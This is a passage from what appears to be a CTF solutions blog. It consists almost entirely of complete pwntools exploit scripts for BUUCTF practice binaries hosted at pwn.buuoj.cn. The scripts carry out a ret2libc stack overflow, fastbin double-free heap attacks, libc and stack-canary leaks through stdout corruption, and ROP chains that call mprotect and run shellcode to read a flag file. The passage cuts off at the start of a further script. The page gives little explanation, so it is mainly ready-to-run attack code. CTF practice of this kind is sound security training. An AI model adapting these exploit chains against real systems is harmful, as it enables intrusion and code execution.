class="line">pwn("pwn.buuoj.cn",20128,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x48-poke-naxtos-sthack-2016"><a href="#0x48-poke-naxtos-sthack-2016" class="headerlink" title="0x48 poke_naxtos_sthack_2016"></a>0x48 poke_naxtos_sthack_2016</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("poke_naxtos_sthack_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./poke_naxtos_sthack_2016")</span><br><span class="line">lib = ELF("/lib/i386-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x86_libc.so.6")</span><br><span class="line">sh.sendline("41")</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.sendline("pik4_p455")</span><br><span class="line">sleep(0.2)</span><br><span class="line">offset = 112</span><br><span class="line">pop_ebp_ret = 0x0804887f</span><br><span class="line">payload = offset*"a" + p32(elf.plt['puts']) + p32(pop_ebp_ret) + p32(elf.got['__libc_start_main']) + p32(elf.symbols['_start'])</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.sendline("1")</span><br><span class="line">sh.recvuntil("Cheat Activated !\n")</span><br><span class="line">__libc_start_main = u32(sh.recvuntil("\xf7"))</span><br><span class="line">libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">system = libc + lib.symbols['system']</span><br><span class="line">binsh = libc + lib.search("/bin/sh\x00").next()</span><br><span class="line">sh.sendline("41")</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.sendline("pik4_p455")</span><br><span class="line">sleep(0.2)</span><br><span class="line">payload = offset * "a"</span><br><span class="line">payload += p32(system) + p32(pop_ebp_ret) + p32(0x080482DB)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("pwn.buuoj.cn",20084,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x49-ciscn-2019-final-4"><a href="#0x49-ciscn-2019-final-4" class="headerlink" title="0x49 ciscn_2019_final_4"></a>0x49 ciscn_2019_final_4</h2><h3 id="和ciscn-sw-10类似"><a href="#和ciscn-sw-10类似" class="headerlink" title="和ciscn_sw_10类似"></a>和ciscn_sw_10类似</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_final_4_back")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(size,content):</span><br><span class="line">sh.sendlineafter(">>","1")</span><br><span class="line">sh.sendlineafter("?",str(size))</span><br><span class="line">sh.sendafter("?",content)</span><br><span class="line">def show(idx):</span><br><span class="line">sh.sendlineafter(">>","3")</span><br><span class="line">sh.sendlineafter("?",str(idx))</span><br><span class="line">def free(idx):</span><br><span class="line">sh.sendlineafter(">>","2")</span><br><span class="line">sh.sendlineafter("?",str(idx))</span><br><span class="line">def inputName(content):</span><br><span class="line">sh.sendafter("what is your name?",content)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./ciscn_final_4_back")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x64_libc.so.6")</span><br><span class="line"></span><br><span class="line">inputName(p64(0x61) * (0xff / 8))</span><br><span class="line">add(0x68,'\x11' * 0x68)</span><br><span class="line">add(0x68,'\x12' * 0x68)</span><br><span class="line">payload = '\x13' * 0x50 + p64(0) + p64(0x71)</span><br><span class="line">add(0x68,payload)</span><br><span class="line">add(0x88,'\x14' * 0x88)</span><br><span class="line">add(0x38,'\x15' * 0x38)</span><br><span class="line">add(0x38,'\x15' * 0x38)</span><br><span class="line">add(0x58,'%17$paaaa%54$p')</span><br><span class="line">free(3)</span><br><span class="line">show(3)</span><br><span class="line">main_arena = u64(sh.recvuntil("\x7f")[-6:].ljust(8,'\x00')) - 88</span><br><span class="line">libc = main_arena - 0x10 - lib.symbols['__malloc_hook']</span><br><span class="line">system = libc +lib.symbols['system']</span><br><span class="line">binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line">__free_hook = libc +lib.symbols['__free_hook']</span><br><span class="line">__malloc_hook = libc +lib.symbols['__malloc_hook']</span><br><span class="line">stdout = libc + lib.symbols['_IO_2_1_stdout_']</span><br><span class="line">printf = libc + lib.symbols['printf']</span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">free(0)</span><br><span class="line">show(0)</span><br><span class="line">heap_base = (u64(sh.recvuntil('\n--------------------',True)[-3:].ljust(8,'\x00')) >> 8) << 8</span><br><span class="line">add(0x68,p64(stdout - 0x43))</span><br><span class="line">add(0x68,p64(stdout - 0x43))</span><br><span class="line">add(0x68,p64(stdout - 0x43))</span><br><span class="line">payload = '\x00' * 3</span><br><span class="line">payload += p64(0) * 6</span><br><span class="line">payload += p64(0xfbad1800) + p64(0) * 3 + p64(libc + lib.symbols['environ']) + p64(libc + lib.symbols['environ'] + 0x8)</span><br><span class="line">add(0x68,payload)</span><br><span class="line">stack_end = u64(sh.recvuntil("--------------------",True)[-8:])</span><br><span class="line">canary_pos = stack_end - (0x3258 - 0x3158)</span><br><span class="line">fastbin_attack = stack_end - 0x7fffffffe548 + 0x7fffffffe2e8 - 3</span><br><span class="line">ret_addr = stack_end - 0x7fffe75e88f8 + 0x7fffe75e86b8</span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">free(0)</span><br><span class="line">add(0x68,p64(stdout - 0x43))</span><br><span class="line">add(0x68,p64(stdout - 0x43))</span><br><span class="line">add(0x68,p64(stdout - 0x43))</span><br><span class="line">payload = '\x00' * 3</span><br><span class="line">payload += p64(0) * 6</span><br><span class="line">payload += p64(0xfbad1800) + p64(0) * 3 + p64(canary_pos) + p64(canary_pos + 0x8)</span><br><span class="line">add(0x68,payload)</span><br><span class="line">canary = u64(sh.recvuntil("--------------------",True)[-8:])</span><br><span class="line">pop_rdi_ret = libc + lib.search(asm("pop rdi\nret")).next()</span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">free(0)</span><br><span class="line">add(0x68,p64(fastbin_attack))</span><br><span class="line">add(0x68,p64(fastbin_attack))</span><br><span class="line">add(0x68,p64(fastbin_attack))</span><br><span class="line">offset = 16</span><br><span class="line">payload = '\x00' * 3</span><br><span class="line">payload += '\x00' * offset</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(0)</span><br><span class="line">payload += p64(libc + lib.search(asm("pop rsi\nret")).next())</span><br><span class="line">payload += p64(ret_addr)</span><br><span class="line">payload += p64(libc + lib.search(asm("pop rdx\nret")).next())</span><br><span class="line">payload += p64(0x100)</span><br><span class="line">payload += p64(libc + lib.symbols['read'])</span><br><span class="line">sleep(0.2)</span><br><span class="line">add(0x68,payload)</span><br><span class="line">offset = 0x40 - 0x8</span><br><span class="line">payload = '\x00' * offset</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64((elf.bss() >> 12) << 12)</span><br><span class="line">payload += p64(libc + lib.search(asm("pop rsi\nret")).next())</span><br><span class="line">payload += p64(0x2000)</span><br><span class="line">payload += p64(libc + lib.search(asm("pop rdx\nret")).next())</span><br><span class="line">payload += p64(7)</span><br><span class="line">payload += p64(libc + lib.symbols['mprotect'])</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(0)</span><br><span class="line">payload += p64(libc + lib.search(asm("pop rsi\nret")).next())</span><br><span class="line">payload += p64(((elf.bss() >> 12) << 12) + 0x800)</span><br><span class="line">payload += p64(libc + lib.search(asm("pop rdx\nret")).next())</span><br><span class="line">payload += p64(0x200)</span><br><span class="line">payload += p64(libc + lib.symbols['read'])</span><br><span class="line">payload += p64(((elf.bss() >> 12) << 12) + 0x800)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(payload)</span><br><span class="line">shellcode  = shellcraft.amd64.openat(0,"/flag.txt",0)</span><br><span class="line">shellcode += shellcraft.amd64.read(3,elf.bss(),0x30)</span><br><span class="line">shellcode += shellcraft.amd64.write(1,elf.bss(),0x30)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(asm(shellcode))</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("pwn.buuoj.cn",20222,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x50-ciscn-2019-s-6"><a href="#0x50-ciscn-2019-s-6" class="headerlink" title="0x50 ciscn_2019_s_6"></a>0x50 ciscn_2019_s_6</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_s_6")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(size,name,phone):</span><br><span class="line">sh.recvuntil("choice:")</span><br><span class="line">sh.sendline("1")</span><br><span class="line">sh.recvuntil("Please input the size of compary's name")</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil("please input name:")</span><br><span class="line">sh.send(name)</span><br><span class="line">sh.recvuntil("please input compary call:")</span><br><span class="line">sh.send(phone)</span><br><span class="line">def show(idx):</span><br><span class="line">sh.recvuntil("choice:")</span><br><span class="line">sh.sendline("2")</span><br><span class="line">sh.recvuntil("Please input the index:")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">def free(idx):</span><br><span class="line">sh.recvuntil("choice:")</span><br><span class="line">sh.sendline("3")</span><br><span class="line">sh.recvuntil("Please input the index:")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./ciscn_s_6")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x64_libc.so.6")</span><br><span class="line">add(0xF0,'a' * 0x80,'\x00' * 0x4 + p64(0x61)) #idx 0</span><br><span class="line">add(0x58,'b' * 0x58,'\x00' * 0x4 + p64(0x61)) #idx 1</span><br><span class="line">add(0x58,'c' * 0x58,'\x00' * 0x4 + p64(0x61)) #idx 2</span><br><span class="line">add(0x68,'d' * 0x68,'\x00' * 4 + p64(0x61))   #idx 3</span><br><span class="line">add(0x68,'e' * 0x68,'\x00' * 4 + p64(0x61))   #idx 4</span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">free(2)</span><br><span class="line">show(0)</span><br><span class="line">main_arena = u64(sh.recvuntil("\x7f",False)[-6:].ljust(8,'\x00')) - 88</span><br><span class="line">libc = main_arena - 0x10 - lib.symbols['__malloc_hook']</span><br><span class="line">__free_hook = libc + lib.symbols['__free_hook']</span><br><span class="line">system = libc + lib.symbols['system']</span><br><span class="line">free(1)</span><br><span class="line">free(3)</span><br><span class="line">free(4)</span><br><span class="line">free(3)</span><br><span class="line">show(2)</span><br><span class="line">heap_base = u64(sh.recvuntil("\x0a\x70\x68",True)[-6:].ljust(8,'\x00'))</span><br><span class="line">heap_base = (heap_base >> 12) << 12</span><br><span class="line">add(0x58,p64(heap_base + 0xD8),'\x00' * 4 + p64(0x61)) #idx 5</span><br><span class="line">add(0x58,"/bin/sh\x00",'\x00' * 4 + p64(0x61)) #idx 6</span><br><span class="line">add(0x58,p64(heap_base + 0xD8),'\x00' * 4 + p64(0x61)) #idx 7</span><br><span class="line">for i in range(0,3):</span><br><span class="line">add(0x68,p64(__free_hook - 0x43),'\x00' * 4 + p64(0x61)) #idx 8-10</span><br><span class="line">payload  = p64(0x21) + p64(heap_base + 0xe8) + p64(0x58) + p64(0) + p64(0x21)</span><br><span class="line">payload += p64(main_arena + 88) + p64(__free_hook - 0x40 - 0x10)</span><br><span class="line">add(0x58,payload,'\x00' * 4 + p64(0x61))#idx 11</span><br><span class="line">payload = '\x00' * 3 + p64(0) * 6 + p64(system)</span><br><span class="line">add(0x68,payload,'\x00' * 4 + p64(0x61)) #idx 12</span><br><span class="line">free(6)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("pwn.buuoj.cn",20157,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x51-ciscn-nw-4"><a href="#0x51-ciscn-nw-4" class="headerlink" title="0x51 ciscn_nw_4"></a>0x51 ciscn_nw_4</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_nw_4")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(size,content):</span><br><span class="line">sh.sendlineafter(">>","1")</span><br><span class="line">sh.sendlineafter("?",str(size))</span><br><span class="line">sh.sendafter("?",content)</span><br><span class="line">def show(idx):</span><br><span class="line">sh.sendlineafter(">>","3")</span><br><span class="line">sh.sendlineafter("?",str(idx))</span><br><span class="line">def free(idx):</span><br><span class="line">sh.sendlineafter(">>","2")</span><br><span class="line">sh.sendlineafter("?",str(idx))</span><br><span class="line">def inputName(content):</span><br><span class="line">sh.sendafter("what is your name?",content)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./ciscn_nw_4")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x64_libc.so.6")</span><br><span class="line">inputName(p64(0x61) * (0x100 / 8))</span><br><span class="line">add(0x68,'\x11' * 0x68)</span><br><span class="line">add(0x68,'\x12' * 0x68)</span><br><span class="line">payload = '\x13' * 0x50 + p64(0) + p64(0x71)</span><br><span class="line">add(0x68,payload)</span><br><span class="line">add(0x88,'\x14' * 0x88)</span><br><span class="line">add(0x38,'\x15' * 0x38)</span><br><span class="line">add(0x38,'\x15' * 0x38)</span><br><span class="line">add(0x58,'%17$paaaa%54$p')</span><br><span class="line">free(3)</span><br><span class="line">show(3)</span><br><span class="line">main_arena = u64(sh.recvuntil("\x7f")[-6:].ljust(8,'\x00')) - 88</span><br><span class="line">libc = main_arena - 0x10 - lib.symbols['__malloc_hook']</span><br><span class="line">system = libc +lib.symbols['system']</span><br><span class="line">binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line">__free_hook = libc +lib.symbols['__free_hook']</span><br><span class="line">__malloc_hook = libc +lib.symbols['__malloc_hook']</span><br><span class="line">stdout = libc + lib.symbols['_IO_2_1_stdout_']</span><br><span class="line">printf = libc + lib.symbols['printf']</span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">free(0)</span><br><span class="line">show(0)</span><br><span class="line">heap_base = (u64(sh.recvuntil('\n--------------------',True)[-3:].ljust(8,'\x00')) >> 8) << 8</span><br><span class="line">add(0x68,p64(stdout - 0x43))</span><br><span class="line">add(0x68,p64(stdout - 0x43))</span><br><span class="line">add(0x68,p64(stdout - 0x43))</span><br><span class="line">payload = '\x00' * 3</span><br><span class="line">payload += p64(0) * 6</span><br><span class="line">payload += p64(0xfbad1800) + p64(0) * 3 + p64(libc + lib.symbols['environ']) + p64(libc + lib.symbols['environ'] + 0x8)</span><br><span class="line">add(0x68,payload)</span><br><span class="line">stack_end = u64(sh.recvuntil("--------------------",True)[-8:])</span><br><span class="line">canary_pos = stack_end - (0xe548 - 0xe448)</span><br><span class="line">fastbin_attack = stack_end - 0x7fffffffe548 + 0x7fffffffe2c5 + 8</span><br><span class="line">ret_addr = stack_end - 0x7fffe75e88f8 + 0x7fffe75e86b8</span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">free(0)</span><br><span class="line">add(0x68,p64(stdout - 0x43))</span><br><span class="line">add(0x68,p64(stdout - 0x43))</span><br><span class="line">add(0x68,p64(stdout - 0x43))</span><br><span class="line">payload = '\x00' * 3</span><br><span class="line">payload += p64(0) * 6</span><br><span class="line">payload += p64(0xfbad1800) + p64(0) * 3 + p64(canary_pos) + p64(canary_pos + 0x8)</span><br><span class="line">add(0x68,payload)</span><br><span class="line">canary = u64(sh.recvuntil("--------------------",True)[-8:])</span><br><span class="line">pop_rdi_ret = 0x400d43</span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">free(0)</span><br><span class="line">add(0x68,p64(fastbin_attack))</span><br><span class="line">add(0x68,p64(fastbin_attack))</span><br><span class="line">add(0x68,p64(fastbin_attack))</span><br><span class="line">offset = 40</span><br><span class="line">payload = '\x00' * 3</span><br><span class="line">payload += '\x00' * offset</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(0)</span><br><span class="line">payload += p64(libc + lib.search(asm("pop rsi\nret")).next())</span><br><span class="line">payload += p64(ret_addr)</span><br><span class="line">payload += p64(libc + lib.search(asm("pop rdx\nret")).next())</span><br><span class="line">payload += p64(0x100)</span><br><span class="line">payload += p64(libc + lib.symbols['read'])</span><br><span class="line">sleep(0.2)</span><br><span class="line">add(0x68,payload)</span><br><span class="line">offset = 56</span><br><span class="line">payload = '\x00' * offset</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64((elf.bss() >> 12) << 12)</span><br><span class="line">payload += p64(libc + lib.search(asm("pop rsi\nret")).next())</span><br><span class="line">payload += p64(0x2000)</span><br><span class="line">payload += p64(libc + lib.search(asm("pop rdx\nret")).next())</span><br><span class="line">payload += p64(7)</span><br><span class="line">payload += p64(libc + lib.symbols['mprotect'])</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(0)</span><br><span class="line">payload += p64(libc + lib.search(asm("pop rsi\nret")).next())</span><br><span class="line">payload += p64(((elf.bss() >> 12) << 12) + 0x800)</span><br><span class="line">payload += p64(libc + lib.search(asm("pop rdx\nret")).next())</span><br><span class="line">payload += p64(0x100)</span><br><span class="line">payload += p64(libc + lib.symbols['read'])</span><br><span class="line">payload += p64(((elf.bss() >> 12) << 12) + 0x800)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(payload)</span><br><span class="line">shellcode  = shellcraft.amd64.open("./flag.txt")</span><br><span class="line">shellcode += shellcraft.amd64.read(3,elf.bss(),0x30)</span><br><span class="line">shellcode += shellcraft.amd64.write(1,elf.bss(),0x30)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(asm(shellcode))</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("pwn.buuoj.cn",20149,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x52-第五空间2019-决赛-PWN5"><a href="#0x52-第五空间2019-决赛-PWN5" class="headerlink" title="0x52 [第五空间2019 决赛]PWN5"></a>0x52 [第五空间2019 决赛]PWN5</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  